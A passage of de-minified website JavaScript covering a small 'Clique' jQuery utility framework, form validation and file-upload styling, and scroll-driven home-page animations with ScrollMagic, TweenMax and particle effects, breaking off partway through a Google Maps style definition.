        arrowButtonMarkup: '<b class="button">&#x25be;</b>',
        disableOnMobile: !1,
        nativeOnMobile: !0,
        openOnFocus: !0,
        openOnHover: !1,
        hoverIntentTimeout: 500,
        expandToItemText: !1,
        responsive: !1,
        preventWindowScroll: !0,
        inheritOriginalWidth: !1,
        allowWrap: !0,
        stopPropagation: !0,
        optionsItemBuilder: "{text}",
        labelBuilder: "{text}",
        listBuilder: !1,
        keys: {
            previous: [37, 38],
            next: [39, 40],
            select: [9, 13, 27],
            open: [13, 32, 37, 38, 39, 40],
            close: [9, 27]
        },
        customClass: {
            prefix: "selectric",
            camelCase: !1
        },
        multiple: {
            separator: ", ",
            keepMenuOpen: !0,
            maxLabelEntries: !1
        }
    }
}),
function(t) {
    "use strict";
    var e = window.Clique = {};
    e.$ = t,
    e.$win = e.$(window),
    e.$doc = e.$(document),
    e.$html = e.$("html"),
    e.$body = e.$("body"),
    e.showLoading = !0,
    e.utils = {
        now: Date.now ||
        function() {
            return (new Date).getTime()
        },
        uid: function(t) {
            return (t || "id") + e.utils.now() + "RAND" + Math.ceil(1e5 * Math.random())
        },
        prefixFor: function(t) {
            var e = ["Webkit", "Moz", "O"],
            i = t[0].toUpperCase() + t.slice(1),
            n = document.createElementNS("http://www.w3.org/2000/svg", "a"),
            r = n.style,
            s = {
                js: "",
                css: ""
            };
            if (i.toLowerCase() in r) return s;
            for (var a = 0; a < e.length; a++) if (e[a] + i in r) {
                var o = e[a].toLowerCase();
                return {
                    js: o[0].toUpperCase() + o.splice(1),
                    css: "-" + o + "-"
                }
            }
            return s
        },
        convertSize: function(t) {
            return t > 1048576 ? (Math.round(100 * t / 1048576) / 100).toString() + "MB": (Math.round(100 * t / 1024) / 100).toString() + "KB"
        }
    },
    window.Clique = e
} (window.jQuery),
function(t, e) {
    "use strict";
    if (!t) throw new Error("The Support module requires the Utility module"); !
    function(t) {
        t.support = {
            requestAnimationFrame: window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame ||
            function(t) {
                setTimeout(t, 1e3 / 60)
            },
            touch: "ontouchstart" in window || window.DocumentTouch && document instanceof window.DocumentTouch || window.navigator.msPointerEnabled && window.navigator.msMaxTouchPoints > 0 || window.navigator.pointerEnabled && window.navigator.maxTouchPoints > 0 || !1,
            mutationobserver: window.MutationObserver || window.WebKitMutationObserver || null
        },
        t.support.hasTouch = !!t.support.touch,
        t.support.transition = function() {
            var t = function() {
                var t = document.body || document.documentElement,
                e = {
                    WebkitTransition: "webkitTransitionEnd",
                    MozTransition: "transitionend",
                    OTransition: "oTransitionEnd otransitionend",
                    transition: "transitionend"
                };
                for (var i in e) if (void 0 !== t.style[i]) return e[i]
            } ();
            return t && {
                end: t
            }
        } (),
        t.support.animation = function() {
            var t = function() {
                var t = document.body || document.documentElement,
                e = {
                    animation: "animationend",
                    WebkitAnimation: "webkitAnimationEnd",
                    MozAnimation: "animationend",
                    OAnimation: "oAnimationEnd oanimationend"
                };
                for (var i in e) if (void 0 !== t.style[i]) return e[i]
            } ();
            return t && {
                end: t
            }
        } ()
    } (t)
} (window.Clique),
function(t) {
    "use strict"; !
    function(t) {
        t.events = {
            scrollstart: {
                setup: function() {
                    var e = t.$(this),
                    i = t.utils.uid("scrollstart"),
                    n = "scrolling.clique.events." + i,
                    r = function(e) {
                        var i = t.$(e.target);
                        e.type = "scrollstart",
                        i.trigger("scrollstart", e)
                    };
                    return e.on("scrollstart",
                    function() {
                        return e.off(n)
                    }),
                    e.on("scrollend",
                    function() {
                        return e.on(n, r).data(i, r)
                    }),
                    e.data("clique.event.scrollstart.uid", i),
                    e.on(n, r).data(i, r)
                },
                teardown: function() {
                    var e = t.$(this),
                    i = e.data("clique.event.scrollstart.uid");
                    return e.off("scrolling.clique.events", e.data(i)),
                    e.removeData(i),
                    e.removeData("clique.event.scrollstart.uid")
                }
            },
            scrollend: {
                latency: 150,
                setup: function(e) {
                    e = t.$.extend({
                        latency: t.$.event.special.scrollend.latency
                    },
                    e);
                    var i = t.$(this),
                    n = t.utils.uid("scrollend"),
                    r = null,
                    s = function(i) {
                        r && window.clearTimeout(r),
                        r = window.setTimeout(function() {
                            return r = null,
                            t.$(i.target).trigger("scrollend", i)
                        },
                        e.latency)
                    };
                    return i.data("clique.event.scrollend.uid", n),
                    i.on("scrolling.clique.events", s).data(n, s)
                },
                teardown: function() {
                    var e = t.$(this),
                    i = e.data("clique.event.scrollend.uid");
                    return e.off("scrolling.clique.events", e.data(i)),
                    e.removeData(i),
                    e.removeData("clique.event.scrollend.uid")
                }
            },
            resizestart: {
                setup: function() {
                    var e, i = t.$(this),
                    n = t.utils.uid("resizestart"),
                    r = "resize.clique.events." + n,
                    s = t.$.event.special.resizeend.latency + 150,
                    a = function(i) {
                        e && window.clearTimeout(e);
                        var n = {
                            height: window.innerHeight,
                            width: window.innerWidth
                        },
                        r = t.$(i.target);
                        r.one("resizeend",
                        function() {
                            e && window.clearTimeout(e)
                        }),
                        e = setTimeout(function() {
                            e = null,
                            n.height === window.innerHeight && n.width === window.innerWidth && r.trigger("resizeend")
                        },
                        s),
                        r.trigger("resizestart", i)
                    };
                    return i.data("clique.event.resizestart.uid", n),
                    i.on("resizestart",
                    function() {
                        return t.$(this).off(r)
                    }),
                    i.on("resizeend",
                    function() {
                        return t.$(this).on(r, a).data(n, a)
                    }),
                    i.on(r, a).data(n, a)
                },
                teardown: function() {
                    var e = t.$(this).data("clique.event.resizestart.uid");
                    return t.$(this).off("resize", t.$(this).data(e)),
                    t.$(this).removeData(e),
                    t.$(this).removeData("clique.event.resizestart.uid")
                }
            },
            resizeend: {
                latency: 250,
                setup: function(e) {
                    var i, n = t.utils.uid("resizeend"),
                    r = t.$.extend({
                        latency: t.$.event.special.resizeend.latency
                    },
                    e),
                    s = "resize.clique.events." + n,
                    a = t.$(this),
                    o = function(e) {
                        i && window.clearTimeout(i),
                        i = setTimeout(function() {
                            return i = null,
                            t.$(e.target).trigger("resizeend", e)
                        },
                        r.latency)
                    };
                    return a.data("clique.event.resizeend.uid", n),
                    a.on("resizeend",
                    function() {
                        return t.$(this).off(s)
                    }),
                    a.on("resizestart",
                    function() {
                        return t.$(this).on(s, o).data(n, o)
                    })
                },
                teardown: function() {
                    var e = t.$(this).data("clique.event.resizeend.uid");
                    return t.$(this).off("resize", t.$(this).data(e)),
                    t.$(this).removeData(e),
                    t.$(this).removeData("clique.event.resizeend.uid")
                }
            }
        };
        var e = function(t) {
            return t ? this.on(i, t) : this.trigger(i)
        };
        for (var i in t.events) {
            var n = t.events[i];
            "object" == typeof n && (t.$.event.special[i] = n, t.$.fn[i] = e)
        }
        window.Clique = t
    } (window.Clique)
} (),
function(t, e) {
    "use strict";
    if (!t) throw new Error("The Browser module requires the Utility module"); !
    function(t) {
        function e(t) {
            return t.test(r)
        }
        function i(t) {
            return r.indexOf(t) > -1
        }
        function n(t, e) {
            t.version = e;
            var i = e.split(".");
            i.length > 0 ? (i = i.reverse(), t.major = i.pop(), i.length > 0 ? (t.minor = i.pop(), i.length > 0 ? (i = i.reverse(), t.patch = i.join(".")) : t.patch = "0") : t.minor = "0") : t.major = "0"
        }
        var r = (window.navigator.userAgent || window.navigator.vendor || window.opera).toLowerCase(),
        s = function() {
            return this.init(),
            this
        };
        s.prototype = {
            init: function() {
                this.defineProperties(),
                this.setHTMLClasses()
            },
            defineProperties: function() {
                this.userAgent = r,
                this.browser = this._detectBrowser()
            },
            setHTMLClasses: function() {
                var e = [];
                e.push(this.browser.name),
                t.$html.addClass(e.join(" "))
            },
            _detectBrowser: function() {
                var t = {};
                return e(/opera|webtv/) || !e(/msie\s([\d\w\.]+)/) && !i("trident") ? i("edge") ? (t.engine = "gecko", t.name = "edge", n(t, e(/edge\/([\d\w\.]+)/) ? RegExp.$1: "")) : i("firefox") ? (t.engine = "gecko", t.name = "firefox", n(t, e(/firefox\/([\d\w\.]+)/) ? RegExp.$1: "")) : i("gecko/") ? t.engine = "gecko": i("opera") || i("opr") ? (t.name = "opera", t.engine = "presto", n(t, e(/version\/([\d\.]+)/) ? RegExp.$1: e(/opera(\s|\/)([\d\.]+)/) ? RegExp.$2: "")) : i("konqueror") ? t.name = "konqueror": i("chrome") ? (t.engine = "webkit", t.name = "chrome", n(t, e(/chrome\/([\d\.]+)/) ? RegExp.$1: "")) : i("iron") ? (t.engine = "webkit", t.name = "iron") : i("crios") ? (t.name = "chrome", t.engine = "webkit", n(t, e(/crios\/([\d\.]+)/) ? RegExp.$1: "")) : i("applewebkit/") ? (t.name = "safari", t.engine = "webkit", n(t, e(/version\/([\d\.]+)/) ? RegExp.$1: "")) : i("mozilla/") && (t.engine = "gecko") : (t.engine = "trident", t.name = "ie", !window.addEventListener && document.documentMode && 7 === document.documentMode ? n(t, "8.compat") : e(/trident.*rv[ :](\d+)\./) ? n(t, RegExp.$1) : n(t, e(/trident\/4\.0/) ? "8": RegExp.$1)),
                t
            }
        },
        t.Browser = new s
    } (t)
} (window.Clique),
function(t) {
    "use strict";
    document.querySelector('input[type="file"]') &&
    function(t) {
        function e(t, e) {
            t.text(e.length + " Files Selected")
        }
        function i(t, e) {
            t.text(e.name)
        }
        function n(n, r) {
            var s = t.$(r),
            a = t.$('<button class="button file-upload">Select File</button>');
            s.before(a),
            s.on("change",
            function() {
                this.files.length > 1 ? e(a, this.files) : i(a, this.files[0])
            })
        }
        function r() {
            a.each(n)
        }
        var s = document.querySelectorAll('input[type="file"]'),
        a = t.$(s);
        t.$doc.one("ready.file_upload", r),
        t.$doc.on("gform_post_render", r)
    } (window.Clique)
} (),
function(t) {
    "use strict";
    document.querySelector("select") &&
    function(t) {
        function e() {
            t.$.fn.selectric && t.$("select").selectric({
                arrowButtonMarkup: '<button class="select-arrow button"></button>'
            })
        }
        t.$doc.one("ready.select", e),
        t.$doc.on("gform_post_render", e)
    } (window.Clique)
} (),
function(t, e) {
    "use strict";
    if (!t) throw new Error("The Form module requires the Utility"); !
    function(t) {
        var e = function(e) {
            return this.element = t.$(e),
            this.init(),
            this
        };
        e.prototype = {
            init: function() {
                this._defineProperties(),
                this._defineElements(),
                this._defineListeners(),
                this._setupForm(),
                this._setupValidation()
            },
            _defineProperties: function() {
                this.namespace = ".clique.form." + t.utils.uid(),
                this.class = "form",
                this.listClass = "form-list",
                this.validationTrigger = ""
            },
            _defineElements: function() {
                this.$list = this.element.find("> ul, > * > ul").first(),
                this.$inputs = this.element.find("input:not([submit]), select, textarea"),
                this.$required = this.element.find("[required]")
            },
            _defineListeners: function() {},
            _setupForm: function() {
                this._setClass(),
                this._setNames()
            },
            _setClass: function() {
                this.element.addClass(this.class),
                this.$list.length && this.$list.addClass(this.listClass)
            },
            _setNames: function() {
                this.$inputs.not("[name]").each(function(e) {
                    t.$(this).attr("name", "form-input-" + e)
                })
            },
            _setupValidation: function() {
                this._setRequiredClass(),
                this._initValidation()
            },
            _setRequiredClass: function() {
                this.$required.not(".required").each(function() {
                    t.$(this).addClass("required")
                })
            },
            _initValidation: function() {
                var e = !1,
                i = this.element.validate({
                    focusInvalid: !1,
                    onkeyup: !1,
                    onfocusout: function(n, r) {
                        if (e) {
                            var s = i.element(n);
                            return console.log(s, t.$(n).data("formerror")),
                            !(!t.$(n).data("formerror") || !s)
                        }
                        return ! 1
                    },
                    onsubmit: function() {
                        return ! 0
                    },
                    showErrors: function(i) {
                        return function(n, r) {
                            e = !0,
                            this.defaultShowErrors(),
                            r.length && i.element.trigger("invalid", r);
                            for (var s, a = 0; a < r.length; a++) {
                                var o = r[a],
                                l = t.$(o.element);
                                0 === a && (s = l),
                                l.closest("li").removeClass("form-valid").addClass("form-error"),
                                l.data("formerror", !0).trigger("invalid")
                            }
                            if (s && s.length) {
                                var c = window.pageYOffset,
                                h = s.offset().top;
                                if (h < window.pageYOffset || h > c + window.innerHeight) {
                                    var u = u < 400 ? 400 : u;
                                    t.$.scrollTo(s, {
                                        offset: -50,
                                        duration: u
                                    },
                                    function() {
                                        s.focus()
                                    })
                                }
                            }
                        }
                    } (this),
                    success: function(e, i) {
                        var n = t.$(e).closest("li"),
                        r = t.$(i);
                        r.hasClass("error") && (r.removeData("formerror").trigger("valid"), n.removeClass("form-error").addClass("form-valid"))
                    }
                })
            }
        },
        t.$("form").each(function() {
            var i = t.$(this);
            i.data("clique.data.form") || i.data("clique.data.form", new e(i))
        })
    } (t)
} (window.Clique),
function(t, e) {
    "use strict";
    if (!t) throw new Error("The Form module requires the Utility module"); !
    function(t) {
        var e = function(e) {
            return this.element = t.$(e),
            this.init(),
            this
        };
        e.duration = 400,
        e.prototype = {
            init: function() {
                this._defineProperties(),
                this._defineListeners()
            },
            _defineProperties: function() {
                this.namespace = ".clique.deadlinks." + t.utils.uid()
            },
            _defineListeners: function() {
                this.element.off(this.namespace),
                this.element.on("click" + this.namespace, this._click.bind(this))
            },
            _click: function(t) {
                t.preventDefault()
            }
        },
        t.$('a[href="#"]').each(function() {
            var i = t.$(this);
            i.data("deadlinks.clique.data") || i.data("deadlinks.clique.data", new e(i))
        })
    } (t)
} (window.Clique),
function(t) {
    "use strict"; !
    function(t) {
        function e(t) {
            t = t || window.location.href;
            var e = document.createElement("a");
            e.href = t;
            var i = e.pathname;
            return "/" === i[0] && (i = i.substr(1)),
            i.replace(/\/|_/g, "-").toLowerCase().split(".")[0]
        }
        var i = function(e) {
            return this.element = t.$(e),
            this.init(),
            this
        };
        i.prototype = {
            init: function() {
                this.defineProperties(),
                this.setClass()
            },
            defineProperties: function() {
                this.duration = 400,
                this.namespace = ".clique.bodyclass." + t.utils.uid(),
                this.slug = e(),
                this.class = "page-template-template-" + (this.slug ? this.slug: "home")
            },
            setClass: function() {
                this.element.addClass(this.class)
            }
        },
        t.$("body:not([class])").each(function() {
            var e = t.$(this);
            e.data("bodyclass.clique.data") || e.data("bodyclass.clique.data", new i(e))
        })
    } (window.Clique)
} (),
function(t, e, i) {
    "use strict";
    var n = {
        common: {
            init: function() { !
                function() {
                    t(".scrollto").on("click",
                    function(e) {
                        e.preventDefault();
                        var i = t(this).attr("href");
                        t("html, body").animate({
                            scrollTop: t(i).offset().top
                        },
                        1e3)
                    })
                } (),
                function() {
                    t(".form-btn").on("click",
                    function(e) {
                        e.preventDefault(),
                        t(".lightbox").fadeIn(600),
                        particlesJS("dust-particles2", {
                            particles: {
                                number: {
                                    value: 20,
                                    density: {
                                        enable: !1,
                                        value_area: 800
                                    }
                                },
                                color: {
                                    value: "#36edff"
                                },
                                shape: {
                                    type: "circle",
                                    stroke: {
                                        width: 0,
                                        color: "#000000"
                                    },
                                    polygon: {
                                        nb_sides: 5
                                    },
                                    image: {
                                        src: "img/github.svg",
                                        width: 100,
                                        height: 100
                                    }
                                },
                                opacity: {
                                    value: 1,
                                    random: !0,
                                    anim: {
                                        enable: !1,
                                        speed: 1,
                                        opacity_min: .1,
                                        sync: !1
                                    }
                                },
                                size: {
                                    value: 10,
                                    random: !0,
                                    anim: {
                                        enable: !1,
                                        speed: 40,
                                        size_min: .1,
                                        sync: !1
                                    }
                                },
                                line_linked: {
                                    enable: !1,
                                    distance: 150,
                                    color: "#ffffff",
                                    opacity: .4,
                                    width: 1
                                },
                                move: {
                                    enable: !0,
                                    speed: 2,
                                    direction: "none",
                                    random: !1,
                                    straight: !1,
                                    out_mode: "out",
                                    bounce: !1,
                                    attract: {
                                        enable: !1,
                                        rotateX: 600,
                                        rotateY: 1200
                                    }
                                }
                            },
                            interactivity: {
                                detect_on: "canvas",
                                events: {
                                    onhover: {
                                        enable: !1,
                                        mode: "repulse"
                                    },
                                    onclick: {
                                        enable: !1,
                                        mode: "push"
                                    },
                                    resize: !0
                                },
                                modes: {
                                    grab: {
                                        distance: 400,
                                        line_linked: {
                                            opacity: 1
                                        }
                                    },
                                    bubble: {
                                        distance: 400,
                                        size: 40,
                                        duration: 2,
                                        opacity: 8,
                                        speed: 3
                                    },
                                    repulse: {
                                        distance: 200,
                                        duration: .4
                                    },
                                    push: {
                                        particles_nb: 4
                                    },
                                    remove: {
                                        particles_nb: 2
                                    }
                                }
                            },
                            retina_detect: !0
                        })
                    }),
                    t(".lightbox .close, .lightbox .close-link").on("click",
                    function(e) {
                        e.preventDefault(),
                        t(".lightbox").fadeOut(600)
                    })
                } ()
            },
            finalize: function() {}
        },
        page_template_template_home: {
            init: function() {
                function e() {
                    t(window).width() < 770 ? t("#hero .hero-scroll").attr("href", "#col-page") : t("#hero .hero-scroll").attr("href", "#section1")
                }
                t(window).load(function() {
                    t(".float-dot1").css("opacity", "1"),
                    t(".float-dot2").css("opacity", "1"),
                    t("#hero .dot1").addClass("on"),
                    t("#hero .dot2").addClass("on"),
                    t("#hero .dot3").addClass("on"),
                    t("#hero .dot4").addClass("on"),
                    t("#hero .photo").addClass("on"),
                    t("#hero .cnt h1").addClass("on"),
                    t("#hero .cnt p").addClass("on"),
                    t("#hero .link").addClass("on"),
                    setTimeout(function() {
                        t(".form-btn").addClass("on"),
                        t(".sticky-nav").addClass("on"),
                        t("#hero .hero-scroll").addClass("on"),
                        t("#hero .hero-scroll div").addClass("rotate"),
                        t(".page-view").addClass("on"),
                        t(".footer-nav").addClass("on")
                    },
                    1300),
                    0 != t(".gform_confirmation_message, .validation_error").length && t("html, body").animate({
                        scrollTop: t("#section6").offset().top
                    },
                    1e3)
                }),
                e(),
                t(window).on("resize",
                function() {
                    e()
                }),
                t(".full-page").on("click",
                function(e) {
                    e.preventDefault(),
                    t("#col-page").fadeOut(100),
                    t("#full-page").fadeIn(300),
                    t(".sticky-nav").removeClass("off"),
                    t(".sticky-nav").addClass("on"),
                    t(".col-page").removeClass("active"),
                    t(".float-dot1").show(),
                    t(".float-dot2").show(),
                    t(this).addClass("active"),
                    t("#hero .hero-scroll").attr("href", "#section1"),
                    t(".footer-nav ul.nav li:first-child a").attr("href", "#section1")
                }),
                t(".col-page").on("click",
                function(e) {
                    e.preventDefault(),
                    t("#full-page").fadeOut(100),
                    t("#col-page").fadeIn(300),
                    t(".full-page").removeClass("active"),
                    t(".float-dot1").hide(),
                    t(".float-dot2").hide(),
                    t(this).addClass("active"),
                    t("#hero .hero-scroll").attr("href", "#col-page"),
                    t(".footer-nav ul.nav li:first-child a").attr("href", "#col-page"),
                    t("html, body").animate({
                        scrollTop: t("#col-page").offset().top
                    },
                    1e3),
                    t(".sticky-nav").addClass("off"),
                    t(".sticky-nav").removeClass("on")
                }),
                t(".section").each(function(e) {
                    var i = t(this);
                    new Waypoint({
                        element: i[0],
                        handler: function(n) {
                            "down" === n && (t(i).addClass("on"), t(".sticky-nav li").removeClass("active"), t(".sticky-nav .section-" + e).addClass("active"))
                        },
                        offset: "77%"
                    }),
                    new Waypoint({
                        element: i[0],
                        handler: function(i) {
                            "up" === i && (t(".sticky-nav li").removeClass("active"), t(".sticky-nav .section-" + e).addClass("active"))
                        },
                        offset: "-1%"
                    })
                });
                new Waypoint({
                    element: document.getElementById("section6"),
                    handler: function(e) {
                        "down" === e && t(".sticky-nav").addClass("off")
                    },
                    offset: "23%"
                }),
                new Waypoint({
                    element: document.getElementById("section6"),
                    handler: function(e) {
                        "up" === e && t(".sticky-nav").removeClass("off")
                    },
                    offset: "23%"
                }),
                new Waypoint({
                    element: document.getElementById("section4"),
                    handler: function(e) {
                        "up" === e && t(".sticky-nav").removeClass("off")
                    },
                    offset: "23%"
                }),
                new Waypoint({
                    element: document.getElementById("full-page"),
                    handler: function(e) {
                        if ("down" === e) {
                            var i = t(".footer-nav li.section1-link").width();
                            t(".footer-nav li").removeClass("active"),
                            t(".footer-nav li.section1-link").addClass("active"),
                            t(".menu-line").css({
                                left: "0",
                                width: i
                            })
                        }
                        "up" === e && (t(".menu-line").css({
                            left: "0",
                            width: "0"
                        }), t(".footer-nav li.section1-link").removeClass("active"))
                    },
                    offset: "50%"
                }),
                new Waypoint({
                    element: document.getElementById("section5"),
                    handler: function(e) {
                        if ("down" === e) {
                            var i = t(".footer-nav li.section5-link").width(),
                            n = t(".footer-nav li.section1-link").width() + 30;
                            t(".footer-nav li").removeClass("active"),
                            t(".footer-nav li.section5-link").addClass("active"),
                            t(".menu-line").css({
                                left: n,
                                width: i
                            })
                        }
                        if ("up" === e) {
                            var i = t(".footer-nav li.section1-link").width();
                            t(".footer-nav li").removeClass("active"),
                            t(".footer-nav li.section1-link").addClass("active"),
                            t(".menu-line").css({
                                left: "0",
                                width: i
                            })
                        }
                    },
                    offset: "50%"
                }),
                new Waypoint({
                    element: document.getElementById("section6"),
                    handler: function(e) {
                        if ("down" === e) {
                            var i = t(".footer-nav li.section6-link").width(),
                            n = t(".footer-nav li.section5-link").width() + 30,
                            r = t(".footer-nav li.section1-link").width() + 30,
                            s = n + r;
                            t(".footer-nav li").removeClass("active"),
                            t(".footer-nav li.section6-link").addClass("active"),
                            t(".menu-line").css({
                                left: s,
                                width: i
                            })
                        }
                        if ("up" === e) {
                            var i = t(".footer-nav li.section5-link").width(),
                            n = t(".footer-nav li.section1-link").width() + 30;
                            t(".footer-nav li").removeClass("active"),
                            t(".footer-nav li.section5-link").addClass("active"),
                            t(".menu-line").css({
                                left: n,
                                width: i
                            })
                        }
                    },
                    offset: "50%"
                });
                t(".footer-nav li").each(function() {
                    if (t(this).hasClass("active")) {
                        if (t(this).hasClass("section1-link")) var e = t(this).position.left;
                        else var e = t(this).position.left + 30;
                        var i = t(this).width();
                        t(".menu-line").css({
                            left: e,
                            width: i
                        })
                    }
                });
                var i = new ScrollMagic.Controller;
                t("#hero").each(function() {
                    var e = (t(this).attr("id"), 6 * t("#hero").height()),
                    n = TweenMax.staggerFromTo(".left-gray", 1, {
                        left: "15%"
                    },
                    {
                        left: "-100%"
                    }),
                    r = (new ScrollMagic.Scene({
                        triggerElement: "#hero",
                        duration: e
                    }).setTween(n).addTo(i), TweenMax.staggerFromTo(".right-gray", 1, {
                        right: "15%"
                    },
                    {
                        right: "-100%"
                    }));
                    new ScrollMagic.Scene({
                        triggerElement: "#hero",
                        duration: e
                    }).setTween(r).addTo(i)
                }),
                t(".split-section").each(function() {
                    var e = t(this).attr("id"),
                    n = TweenMax.fromTo("#" + e + " .content", 1, {
                        transform: "translate3d(0, 120px, 0)"
                    },
                    {
                        transform: "translate3d(0, 520px, 0)"
                    });
                    new ScrollMagic.Scene({
                        triggerElement: "#" + e,
                        duration: 2e3,
                        reverse: !0
                    }).setTween(n).addTo(i)
                }),
                function() {
                    if (t(window).width() > 1023) var e = 780,
                    n = 550;
                    if (t(window).width() < 1023) var e = 620,
                    n = 550;
                    var r = t("#section1").offset().top,
                    s = t("#section1").height() / 2,
                    a = r + s;
                    if (t(window).width() > 1023) {
                        var o = TweenMax.fromTo(".float-dot1", 1, {
                            transform: "translate3d(-400px, 880px, 0)"
                        },
                        {
                            transform: "translate3d(350px, " + a + "px, 0)"
                        }),
                        l = (new ScrollMagic.Scene({
                            triggerElement: "#section1",
                            duration: e,
                            reverse: !0
                        }).setTween(o).addTo(i), TweenMax.fromTo(".float-dot2", 1, {
                            transform: "translate3d(-400px, 880px, 0)"
                        },
                        {
                            transform: "translate3d(160px, " + a + "px, 0)"
                        }));
                        new ScrollMagic.Scene({
                            triggerElement: "#section1",
                            duration: n,
                            reverse: !0
                        }).setTween(l).addTo(i)
                    }
                    if (t(window).width() < 1023) {
                        var o = TweenMax.fromTo(".float-dot1", 1, {
                            transform: "translate3d(-400px, 880px, 0)"
                        },
                        {
                            transform: "translate3d(150px, 880px, 0)"
                        }),
                        l = (new ScrollMagic.Scene({
                            triggerElement: "#section1",
                            duration: e,
                            reverse: !0
                        }).setTween(o).addTo(i), TweenMax.fromTo(".float-dot2", 1, {
                            transform: "translate3d(-400px, 880px, 0)"
                        },
                        {
                            transform: "translate3d(60px, " + a + "px, 0)"
                        }));
                        new ScrollMagic.Scene({
                            triggerElement: "#section1",
                            duration: n,
                            reverse: !0
                        }).setTween(l).addTo(i)
                    }
                    var c = t("#section2").offset().top,
                    h = t("#section2").height() / 2,
                    u = c + h;
                    if (t(window).width() > 1023) {
                        var d = TweenMax.fromTo(".float-dot1", 1, {
                            transform: "translate3d(350px, " + a + "px, 0)"
                        },
                        {
                            transform: "translate3d(940px, " + u + "px, 0)"
                        }),
                        p = (new ScrollMagic.Scene({
                            triggerElement: "#section2",
                            duration: e,
                            reverse: !0
                        }).setTween(d).addTo(i), TweenMax.fromTo(".float-dot2", 1, {
                            transform: "translate3d(160px, " + a + "px, 0)"
                        },
                        {
                            transform: "translate3d(740px, " + u + "px, 0)"
                        }));
                        new ScrollMagic.Scene({
                            triggerElement: "#section2",
                            duration: n,
                            reverse: !0
                        }).setTween(p).addTo(i)
                    }
                    if (t(window).width() < 1023) {
                        var d = TweenMax.fromTo(".float-dot1", 1, {
                            transform: "translate3d(150px, " + a + "px, 0)"
                        },
                        {
                            transform: "translate3d(440px, " + u + "px, 0)"
                        }),
                        p = (new ScrollMagic.Scene({
                            triggerElement: "#section2",
                            duration: e,
                            reverse: !0
                        }).setTween(d).addTo(i), TweenMax.fromTo(".float-dot2", 1, {
                            transform: "translate3d(60px, " + a + "px, 0)"
                        },
                        {
                            transform: "translate3d(840px, " + u + "px, 0)"
                        }));
                        new ScrollMagic.Scene({
                            triggerElement: "#section2",
                            duration: n,
                            reverse: !0
                        }).setTween(p).addTo(i)
                    }
                    var f = t("#section3").offset().top,
                    m = t("#section3").height() / 2,
                    g = f + m;
                    if (t(window).width() > 1023) {
                        var v = TweenMax.fromTo(".float-dot1", 1, {
                            transform: "translate3d(940px, " + u + "px, 0)"
                        },
                        {
                            transform: "translate3d(-40px, " + g + "px, 0)"
                        }),
                        _ = (new ScrollMagic.Scene({
                            triggerElement: "#section3",
                            duration: e,
                            reverse: !0
                        }).setTween(v).addTo(i), TweenMax.fromTo(".float-dot2", 1, {
                            transform: "translate3d(740px, " + u + "px, 0)"
                        },
                        {
                            transform: "translate3d(500px, " + g + "px, 0)"
                        }));
                        new ScrollMagic.Scene({
                            triggerElement: "#section3",
                            duration: n,
                            reverse: !0
                        }).setTween(_).addTo(i)
                    }
                    if (t(window).width() < 1023) {
                        var v = TweenMax.fromTo(".float-dot1", 1, {
                            transform: "translate3d(440px, " + u + "px, 0)"
                        },
                        {
                            transform: "translate3d(140px, " + g + "px, 0)"
                        }),
                        _ = (new ScrollMagic.Scene({
                            triggerElement: "#section3",
                            duration: e,
                            reverse: !0
                        }).setTween(v).addTo(i), TweenMax.fromTo(".float-dot2", 1, {
                            transform: "translate3d(840px, " + u + "px, 0)"
                        },
                        {
                            transform: "translate3d(100px, " + g + "px, 0)"
                        }));
                        new ScrollMagic.Scene({
                            triggerElement: "#section3",
                            duration: n,
                            reverse: !0
                        }).setTween(_).addTo(i)
                    }
                    var y = t("#section4").offset().top,
                    b = t("#section4").height() / 2,
                    w = y + b;
                    if (t(window).width() > 1023) {
                        var x = TweenMax.fromTo(".float-dot1", 1, {
                            transform: "translate3d(-40px, " + g + "px, 0)"
                        },
                        {
                            transform: "translate3d(980px, " + w + "px, 0)"
                        }),
                        T = (new ScrollMagic.Scene({
                            triggerElement: "#section4",
                            duration: e,
                            reverse: !0
                        }).setTween(x).addTo(i), TweenMax.fromTo(".float-dot2", 1, {
                            transform: "translate3d(500px, " + g + "px, 0)"
                        },
                        {
                            transform: "translate3d(780px, " + w + "px, 0)"
                        }));
                        new ScrollMagic.Scene({
                            triggerElement: "#section4",
                            duration: n,
                            reverse: !0
                        }).setTween(T).addTo(i)
                    }
                    if (t(window).width() < 1023) {
                        var x = TweenMax.fromTo(".float-dot1", 1, {
                            transform: "translate3d(140px, " + g + "px, 0)"
                        },
                        {
                            transform: "translate3d(480px, " + w + "px, 0)"
                        }),
                        T = (new ScrollMagic.Scene({
                            triggerElement: "#section4",
                            duration: e,
                            reverse: !0
                        }).setTween(x).addTo(i), TweenMax.fromTo(".float-dot2", 1, {
                            transform: "translate3d(100px, " + g + "px, 0)"
                        },
                        {
                            transform: "translate3d(780px, " + w + "px, 0)"
                        }));
                        new ScrollMagic.Scene({
                            triggerElement: "#section4",
                            duration: n,
                            reverse: !0
                        }).setTween(T).addTo(i)
                    }
                } (),
                0 != t("#map").length &&
                function() {
                    var t = [{
                        featureType: "all",
                        elementType: "labels.text.fill",
                        stylers: [{
                            saturation: 36
                        },
                        {
                            color: "#000000"
                        },
                        {
                            lightness: 40
                        }]
                    },
                    {
                        featureType: "all",
                        elementType: "labels.text.stroke",
                        stylers: [{
                            visibility: "on"
                        },
                        {
                            color: "#000000"
                        },
                        {
                            lightness: 16
                        }]
                    },
                    {
                        featureType: "all",
                        elementType: "labels.icon",
                        stylers: [{
                            visibility: "off"
                        }]
                    },
                    {
                        featureType: "administrative",
                        elementType: "geometry.fill",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 20
                        }]
                    },
                    {
                        featureType: "administrative",
                        elementType: "geometry.stroke",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 17
                        },
                        {
                            weight: 1.2
                        }]
                    },
                    {
                        featureType: "landscape",
                        elementType: "geometry",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 20
                        }]
                    },
                    {
                        featureType: "poi",
                        elementType: "geometry",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 21
                        }]
                    },
                    {
                        featureType: "road.highway",
                        elementType: "geometry.fill",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 17
                        }]
                    },
                    {
                        featureType: "road.highway",
                        elementType: "geometry.stroke",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 29
                        },
                        {
                            weight: .2
                        }]
                    },
                    {
                        featureType: "road.arterial",
                        elementType: "geometry",
